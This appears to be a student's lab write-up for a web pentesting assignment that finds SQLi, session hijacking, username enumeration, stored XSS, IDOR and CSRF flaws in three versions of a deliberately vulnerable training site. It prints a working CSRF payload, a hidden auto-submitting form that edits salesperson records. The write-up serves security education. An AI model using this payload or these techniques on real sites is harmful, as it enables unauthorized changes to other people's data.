# Project 8 - Pentesting Live Targets

Time spent: **7** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: <img src='https://imgur.com/a/0RsTR' title='SQLi Exploit' width='' alt='GIF Walkthrough' /> You are able to add in code like a sleep in the url as shown in the GIF. 

Vulnerability #2: <https://imgur.com/a/R5mBF' title='Session Hijacking' width='' alt='GIF Walkthrough' /> Here you can see I am logged in on the left in chrome but on the right in IE I am not logged in. I can take the session from chrome and paste it in IE and now I am logged in on IE.

## Green

Vulnerability #1: <img src='https://imgur.com/a/Pw6tc' title='Username Enumeration' width='' alt='GIF Walkthrough' /> You can see when I try to log in with "fakeuser" the error text is not bold but when I log in with "jmonroe99" it is bold showing that it is a valid username. The other sites always show the same font. 

Vulnerability #2: <img src='https://imgur.com/a/PxbFd' title='XSS' width='' alt='GIF Walkthrough' /> To get the script to run you need to make feedback as a non-logged in person that has the script as the actual feedback test. Then when an admin logs in and checks the feedback the script will run! 


## Red

Vulnerability #1: <img src='https://imgur.com/a/O0Q4H' title='IDOR Exploit' width='' alt='GIF Walkthrough' />  This is the  Insecure Direct Object Reference vulnerability. You can see in the gif that as a not logged in user we are able to see the new salesperson who is not supposed to be public by just changing the ID. 

Vulnerability #2: <img src = 'https://imgur.com/a/PqvbE' title='CSRF Exploit' width='' alt='GIF Walkthrough' /> Here you can create a small form that will load and edit the sales people. See that I added myself as a sales person.  The code I used is below 

````

<html>
  <head>
    <title>Edit Salespeople</title>
  </head>
  <body onload="document.edit_salesperson.submit()">
    <form action="https://35.184.87.12/red/public/staff/salespeople/edit.php?id=5" method="POST" name="edit_salesperson" style="display: none;" target="hidden_results" >
      <input type="text" name="first_name" value="Jason"><br>
      <input type="text" name="last_name" value="Merewitz"><br>
      <input type="text" name="phone" value="123-456-1337"><br>
      <input type="text" name="email" value="sales@person.com"><br>
    </form>
    <iframe name="hidden_results" style="display: none;"></iframe>
  </body>
</html>

````
## Notes

Describe any challenges encountered while doing the work
